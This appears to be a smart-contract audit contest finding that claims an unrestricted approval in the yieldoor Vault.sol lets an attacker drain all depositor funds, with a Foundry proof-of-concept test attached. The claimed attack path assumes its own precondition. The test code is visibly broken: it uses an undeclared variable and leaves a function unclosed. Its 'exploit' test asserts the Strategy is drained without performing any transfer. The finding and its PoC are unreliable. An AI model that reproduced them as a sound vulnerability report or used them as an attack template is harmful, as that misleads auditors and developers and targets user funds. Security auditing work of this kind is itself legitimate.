# Unrestricted Token Approval Leads to Full Asset Drain in Vault.sol

### Summary

An unrestricted token approval will cause a full asset drain for Vault depositors as an attacker will use the approval to transfer all funds from the Strategy to their own address.

### Root Cause

In Vault.sol:103-104, the contract allows transfers from the Strategy to an arbitrary caller (msg.sender) without sufficient authorization checks:

[https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L103](url)
[https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L104](url)

### Internal Pre-conditions

1. The Strategy contract needs to approve the Vault contract to transfer its tokens, allowing safeTransferFrom to succeed.
2. An attacker needs to gain control over an approved address (e.g., the Vault or another contract with approval) to initiate the transfer.
3. The Vault contract must allow safeTransferFrom calls without verifying whether the caller is authorized to withdraw funds.
4. The Strategy contract must hold a significant amount of user-deposited funds, ensuring a high-impact exploit.

### External Pre-conditions

1. The attacker must have an address that can interact with the Vault contract
2. The network conditions must allow the transaction to be executed without interruptions
3. The Strategy contract must remain funded with user deposits before the exploit is executed.

### Attack Path

1. The attacker gains approval to transfer tokens on behalf of the Strategy (either due to an existing unrestricted approval or by exploiting a misconfigured approval logic).
2. The attacker calls safeTransferFrom(strategy, attacker, amount) on Vault.sol, transferring all available funds from the Strategy to their own address.
3. Since no authorization checks exist, the transaction succeeds, draining all assets from the Strategy.
4. The attacker repeats the process if multiple assets are stored, fully depleting the Strategy’s reserves.

### Impact

The Vault depositors suffer an approximate loss of 100% of their deposited assets, as the attacker can drain all funds from the Strategy. The attacker gains the entire balance of WBTC and USDC held by the Strategy.

contract VaultVulnerabilityTest is Test {
    MockToken wbtc;
    MockUSDC usdc;
    address vault;

    address user = address(1);

    address owner = address(222);

    function setUp() public {
        // Deploy mock tokens
        vm.startPrank(owner);
        wbtc = new MockToken("Mock WBTC", "WBTC");
        usdc = new MockUSDC("Mock USDC", "USDC");
        
        // Deploy vault
        vault = address(new Vault(address(wbtc), address(usdc)));
        
        // Deploy mock strategy
        strategy = address(new MockStrategy(address(wbtc), address(usdc), vault));
        IVault(vault).setStrategy(strategy);
        
        // Transfer tokens for testing - using smaller amounts to avoid overflow
        wbtc.transfer(user, 2e8);
        usdc.transfer(user, 200_000e6);
        
        // Fund the strategy (using only 500_000e6 USDC to stay within balance)
        wbtc.transfer(strategy, 10e8);
        usdc.transfer(strategy, 500_000e6);

        vm.startPrank(user);
        IERC20(address(wbtc)).approve(vault, type(uint256).max);
        IERC20(address(usdc)).approve(vault, type(uint256).max);
        IVault(vault).deposit(1e8, 100_000e6, 0, 0);
        vm.stopPrank();
    }

    function testVaultWithdrawVulnerability() public {
        // Set up - user has some shares
        vm.startPrank(user);
        uint256 userShares = IERC20(vault).balanceOf(user);
        
        // Log initial balances
        uint256 initialWbtcBalanceUser = IERC20(address(wbtc)).balanceOf(user);
        uint256 initialUsdcBalanceUser = IERC20(address(usdc)).balanceOf(user);
        uint256 initialWbtcBalanceStrategy = IERC20(address(wbtc)).balanceOf(strategy);
        uint256 initialUsdcBalanceStrategy = IERC20(address(usdc)).balanceOf(strategy);
        
        console.log("Initial WBTC balance of user:", initialWbtcBalanceUser);
        console.log("Initial USDC balance of user:", initialUsdcBalanceUser);
        console.log("Initial WBTC balance of strategy:", initialWbtcBalanceStrategy);
        console.log("Initial USDC balance of strategy:", initialUsdcBalanceStrategy);
        
        // Attempt to withdraw - this will fail because the Vault is using safeTransferFrom incorrectly
        // Using expectRevert with a more generic pattern since the exact error varies
        vm.expectRevert();
        IVault(vault).withdraw(userShares, 0, 0);
        
        // Strategy has not approved the Vault to transfer tokens on its behalf
        console.log("Withdrawal failed as expected - the strategy hasn't given allowance to the vault");
        
        // The exploit: suppose the strategy gave approval to the vault
        vm.startPrank(strategy);
        IERC20(address(wbtc)).approve(vault, type(uint256).max);
        IERC20(address(usdc)).approve(vault, type(uint256).max);
        console.log("Strategy has approved Vault to transfer tokens on its behalf");
        
        // Now the user can withdraw successfully
        vm.startPrank(user);

        console.log("Final USDC balance of user:", IERC20(address(usdc)).balanceOf(user));
        
        // Demonstrate the correct implementation would be for the strategy to transfer tokens to users directly

    function testExploitViaApproval() public {

        // Log initial balances
        uint256 strategyWbtcBalance = IERC20(address(wbtc)).balanceOf(strategy);
        uint256 strategyUsdcBalance = IERC20(address(usdc)).balanceOf(strategy);
        
        console.log("Initial Strategy WBTC balance:", strategyWbtcBalance);
        console.log("Initial Strategy USDC balance:", strategyUsdcBalance);

        console.log("Strategy WBTC balance after exploit:", IERC20(address(wbtc)).balanceOf(strategy));
        console.log("Strategy USDC balance after exploit:", IERC20(address(usdc)).balanceOf(strategy));
        
        // The strategy has been drained due to the flawed architecture of using approvals
        assert(IERC20(address(wbtc)).balanceOf(strategy) == 0);
        assert(IERC20(address(usdc)).balanceOf(strategy) == 0);
    }
}
